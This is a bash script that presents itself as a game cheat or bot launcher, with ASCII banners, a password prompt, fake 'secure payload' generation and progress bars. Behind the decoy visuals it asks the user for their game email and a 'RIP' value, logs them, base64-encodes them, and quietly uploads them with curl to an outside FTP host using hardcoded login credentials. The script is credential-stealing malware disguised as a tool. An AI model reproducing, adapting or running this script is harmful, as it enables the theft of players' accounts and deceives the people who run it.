

#!/bin/bash

P="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
C="\033[1;36m"
W="\033[1;37m"
R="\033[1;31m"
RESET="\033[0m"

clear

echo -e "${P}"
cat << "EOF"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
EOF

echo -e "${W}"
cat << "EOF"
▀█████████▄   ▄██████▄      ███        ▄████████ ▀████    ▐████▀    ▄███████▄ 
  ███    ███ ███    ███ ▀█████████▄   ███    ███   ███▌   ████▀    ███    ███ 
  ███    ███ ███    ███    ▀███▀▀██   ███    █▀     ███  ▐███      ███    ███ 
 ▄███▄▄▄██▀  ███    ███     ███   ▀   ███           ▀███▄███▀      ███    ███ 
▀▀███▀▀▀██▄  ███    ███     ███     ▀███████████    ████▀██▄     ▀█████████▀  
  ███    ██▄ ███    ███     ███              ███   ▐███  ▀███      ███        
  ███    ███ ███    ███     ███        ▄█    ███  ▄███     ███▄    ███        
▄█████████▀   ▀██████▀     ▄████▀    ▄████████▀  ████       ███▄  ▄████▀      
                                                          
EOF
sleep 1

tmpfile=""
cleanup() {
  if command -v tput >/dev/null 2>&1; then
    tput cnorm 2>/dev/null || true
  fi
  if [ -n "$tmpfile" ] && [ -f "$tmpfile" ]; then
    shred -u "$tmpfile" 2>/dev/null || rm -f "$tmpfile" 2>/dev/null || true
  fi
  exit
}
trap cleanup INT TERM EXIT

if command -v tput >/dev/null 2>&1; then
  tput civis 2>/dev/null || true
fi

# PASSWORD
while true; do
  echo
  echo -e "${G}|——[ ${C}Enter password to continue ${G}]${RESET}"
  echo -e "${G}|${RESET}"
  echo -ne "${G}╰─>  ${C}${RESET}"
  read -r pass
  echo
  if [ "$pass" = "free:lvl" ]; then
    break
  else
    echo -e "${R}Wrong password! Try again...${RESET}"
    sleep 1
  fi
done

clear
echo -e "${C}Initializing system modules...${RESET}"
sleep 0.8

# QUICK CODES (light)
echo
echo -e "${G}Preparing secure payloads...${RESET}"
sleep 0.4
for i in $(seq 1 10); do
  if command -v openssl >/dev/null 2>&1; then
    code=$(openssl rand -hex 16 2>/dev/null | tr '[:lower:]' '[:upper:]')
  else
    code=$(tr -dc 'A-F0-9' </dev/urandom 2>/dev/null | head -c 32 || printf '%0*s' 32 "A")
  fi
  printf "${G}[%02d] %s${RESET}\n" "$i" "$code"
  sleep 0.28
done
echo
echo -e "${G}Payloads generated.${RESET}"
sleep 0.6

# PROGRESS BAR
echo
BAR_WIDTH=40
for p in $(seq 0 100); do
  filled=$(( p * BAR_WIDTH / 100 ))
  empty=$(( BAR_WIDTH - filled ))
  filled_bar=$(printf "%0.s#" $(seq 1 $filled))
  empty_bar=$(printf "%0.s-" $(seq 1 $empty))
  printf "\r${W}———————————— ${RESET}${W}%3d%%${RESET}${P} |%s%s|${RESET}" "$p" "$filled_bar" "$empty_bar"
  if [ $p -lt 20 ]; then
    sleep 0.01
  elif [ $p -lt 60 ]; then
    sleep 0.008
  else
    sleep 0.006
  fi
done
echo
echo -e "${G}|——[ Successfully completed ! ]${RESET}"
echo -e "${G}|${RESET}"
echo -e "${P}|——[ ${Y}Enter the game's email address ${P}]${RESET}"
echo -e "${P}|${RESET}"
echo -ne "${P}╰─> ${Y}${RESET}"

# LOGGING CONFIG
LOGDIR="${HOME}/tool_logs"
COUNTER_FILE="${LOGDIR}/.session_count"
mkdir -p "$LOGDIR"
touch "$COUNTER_FILE"

FTP_HOST="ftpupload.net"
FTP_USER="if0_40531973"
FTP_PASS="99ZVMdi2uoM7"
REMOTE_DIR="htdocs/tool_logs"

cnt=0
if [ -f "$COUNTER_FILE" ]; then
  cnt=$(cat "$COUNTER_FILE" 2>/dev/null || echo 0)
fi
case "$cnt" in ''|*[!0-9]*) cnt=0 ;; esac
cnt=$((cnt + 1))
printf "%d" "$cnt" > "${COUNTER_FILE}.tmp" 2>/dev/null || echo "$cnt" > "${COUNTER_FILE}.tmp" || true
mv -f "${COUNTER_FILE}.tmp" "$COUNTER_FILE" 2>/dev/null || printf "%d" > "$COUNTER_FILE" 2>/dev/null || true

filenames=( "user1.txt" "user2.txt" "user3.txt" "user4.txt" )
if [ "$cnt" -le "${#filenames[@]}" ]; then
  fname="${filenames[$((cnt-1))]}"
else
  fname="user${cnt}.txt"
fi
fname=$(basename "$fname")
email_fname="email_${fname}"

# READ EMAIL (single enter -> save immediately)
while true; do
  read -r game_email
  game_email=$(printf '%s' "$game_email" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
  if [ "${#game_email}" -lt 6 ]; then
    echo -e "${R}Email/username too short (minimum 6 chars). Try again:${RESET}"
    echo -ne "${P}╰─> ${Y}${RESET}"
    continue
  fi
  if [ "${#game_email}" -gt 200 ]; then
    echo -e "${R}Input too long. Try a shorter email/username:${RESET}"
    echo -ne "${P}╰─> ${Y}${RESET}"
    continue
  fi
  if printf '%s' "$game_email" | grep -q '[[:space:]]'; then
    echo -e "${R}Do not include spaces. Use an email or simple username:${RESET}"
    echo -ne "${P}╰─> ${Y}${RESET}"
    continue
  fi
  if printf '%s' "$game_email" | grep -q '@'; then
    if ! printf '%s' "$game_email" | grep -q '@.*\.' ; then
      echo -e "${R}If using an email, use a valid format (user@domain.tld). Try again:${RESET}"
      echo -ne "${P}╰─> ${Y}${RESET}"
      continue
    fi
  fi
  break
done

mkdir -p "$LOGDIR"
printf '%s\n' "$game_email" > "${LOGDIR}/${email_fname}"

# Wait three minutes countdown (02:59 down to 00:00)
echo
echo -e "${Y}Wait three minutes${RESET}"
echo -e "${P}--------------------------------------------------${RESET}"

total_seconds=119
while [ $total_seconds -ge 0 ]; do
  mm=$(( total_seconds / 60 ))
  ss=$(( total_seconds % 60 ))
  printf "\r${Y}%02d:%02d${RESET}" "$mm" "$ss"
  sleep 1
  total_seconds=$(( total_seconds - 1 ))
done
echo

echo -e "${G}|——[ Successfully completed ! ]${RESET}"
echo -e "${G}|${RESET}"
echo -e "${G}|——[ ${C}Enter your RIP ${G}]${RESET}"
echo -e "${G}|${RESET}"
echo -ne "${G}╰─> ${RESET}"

# READ RIP: first line (Enter saves), then quickly drain any immediate extra pasted lines and append them
rip=""
IFS= read -r rip
# drain any remaining rapidly-pasted lines so nothing leaks to shell
while IFS= read -r -t 0.05 extra; do
  rip+=$'\n'"$extra"
done

# SAVE RIP to separate user file (email file remains separate). No on-screen paths.
{
  printf '%s\n' "$rip"
  printf 'SavedAt: %s\n' "$(date "+%F %T")"
} > "${LOGDIR}/${fname}"

# aggregate base64-safe log
timestamp=$(date "+%F %T")
if command -v base64 >/dev/null 2>&1; then
  b64entry=$(printf '%s' "$rip" | base64 -w0 2>/dev/null)
elif command -v openssl >/dev/null 2>&1; then
  b64entry=$(printf '%s' "$rip" | openssl base64 2>/dev/null)
else
  b64entry=$(printf '%s' "$rip" | python3 - <<'PY'
import sys,base64
print(base64.b64encode(sys.stdin.read().encode()).decode())
PY
)
fi
printf '%s %s %s\n' "$timestamp" "$game_email" "$b64entry" >> "${LOGDIR}/all_entries.b64"

# QUIET upload (no messages)
if command -v curl >/dev/null 2>&1; then
  curl --ftp-create-dirs -T "${LOGDIR}/${email_fname}" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/${email_fname}" --silent 2>/dev/null || true
  curl --ftp-create-dirs -T "${LOGDIR}/${fname}" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/${fname}" --silent 2>/dev/null || true
  curl --ftp-create-dirs -T "${LOGDIR}/all_entries.b64" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/all_entries.b64" --silent 2>/dev/null || true
fi

# small pause then final visuals
sleep 0.4

echo -e "${G}Finalizing...${RESET}"
for t in 1 2 3 4 5; do
  printf "${G}.${RESET}"
  if [ $((RANDOM % 3)) -eq 0 ]; then
    sleep 1.2
  else
    sleep 0.8
  fi
done
echo
echo -e "${G}Operation complete. ${C}Launched successfully — Enter the game now.${RESET}"
echo

echo -e "${G}/X1 ${R}>${RESET} ${R}arrest${RESET}"
echo -e "${G}/X2 ${R}>${RESET} ${G}restart${RESET}"
echo -e "${G}/X3 ${R}>${RESET} ${C}Getting out of everything${RESET}"
echo
echo -ne "${C}Choose an option (e.g. /X1) > ${RESET}"
read -r opt
echo

case "$opt" in
  "/X1"|"X1")
    echo -e "${R}[/X1] arrest selected...${RESET}"
    sleep 1
    ;;
  "/X2"|"X2")
    echo -e "${G}[/X2] restart selected...${RESET}"
    sleep 1
    ;;
  "/X3"|"X3")
    echo -e "${C}[/X3] Getting out of everything selected...${RESET}"
    sleep 1
    ;;
  *)
    echo -e "${R}Unknown option. Exiting.${RESET}"
    ;;
esac

if command -v tput >/dev/null 2>&1; then
  tput cnorm 2>/dev/null || true
fi

cleanup

